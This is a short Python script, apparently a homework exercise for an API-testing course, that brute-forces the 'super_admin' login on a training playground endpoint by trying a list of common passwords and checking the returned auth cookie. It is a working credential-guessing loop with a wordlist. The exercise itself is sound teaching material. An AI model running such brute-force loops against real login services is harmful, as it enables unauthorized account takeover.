import time
import requests
import json

strPasswords = '1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 password password 123456 123456 123456 123456 123456 123456 123456 123456 123456 password password password password password password 123456789 12345678 12345678 12345678 12345 12345678 12345 12345678 123456789 qwerty qwerty abc123 qwerty 12345678 qwerty 12345678 qwerty 12345678 password abc123 qwerty abc123 qwerty 12345 football 12345 12345 1234567 monkey monkey 123456789 123456789 123456789 qwerty 123456789 111111 12345678 1234567 letmein 111111 1234 football 1234567890 letmein 1234567 12345 letmein dragon 1234567 baseball 1234 1234567 1234567 sunshine iloveyou trustno1 111111 iloveyou dragon 1234567 princess football qwerty 111111 dragon baseball adobe123 football baseball 1234 iloveyou iloveyou 123123 baseball iloveyou 123123 1234567 welcome login admin princess abc123 111111 trustno1 admin monkey 1234567890 welcome welcome admin qwerty123 iloveyou 1234567 1234567890 letmein abc123 solo monkey welcome 1q2w3e4r master sunshine letmein abc123 111111 abc123 login 666666 admin sunshine master photoshop 111111 1qaz2wsx admin abc123 abc123 qwertyuiop ashley 123123 1234 mustang dragon 121212 starwars football 654321 bailey welcome monkey access master flower 123123 123123 555555 passw0rd shadow shadow shadow monkey passw0rd dragon monkey lovely shadow ashley sunshine master letmein dragon passw0rd 654321 7777777 123123 football 12345 michael login sunshine master !@#$%^&* welcome 654321 jesus password1 superman princess master hello charlie 888888 superman michael princess 696969 qwertyuiop hottie freedom aa123456 princess qazwsx ninja azerty 123123 solo loveme whatever donald dragon michael mustang trustno1 batman passw0rd zaq1zaq1 qazwsx password1 password1 Football password1 0 trustno1 starwars password1 trustno1 qwerty123 123qwe'
#listPasswords = ['password','123456','123456789',
 #               '12345678','12345','qwerty','abc123','football','1234567','monkey','111111','letmein','1234',
  #              '1234567890','dragon','baseball','sunshine','iloveyou','trustno1','princess','adobe123',
   #             '123123','welcome','login','admin','qwerty123','solo','1q2w3e4r','master','666666','photoshop',
    #            '1qaz2wsx','qwertyuiop','ashley','mustang','121212','starwars','654321','bailey','access',
     #           'flower','555555','passw0rd','shadow','lovely','7777777','michael','!@#$%^&*','jesus','password1',
      #          'superman','hello','charlie','888888','696969','hottie','freedom','aa123456','qazwsx','ninja','azerty',
       #         'loveme','whatever','donald','batman','zaq1zaq1','Football','123qwe']
# строку записать в лист
listPasswords = strPasswords.split(' ')

#перебор паролей
for i in range (len(listPasswords)):
    requestData = {"login": "super_admin", "password": listPasswords[i]}
    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data = requestData)
    cookies = response1.cookies

    response2 = requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies = cookies)

    if response2.text == 'You are authorized':
        print('Авторизация:', response2.text)
        print('"login": super_admin','\n', f'"password": {listPasswords[i]}')
        break


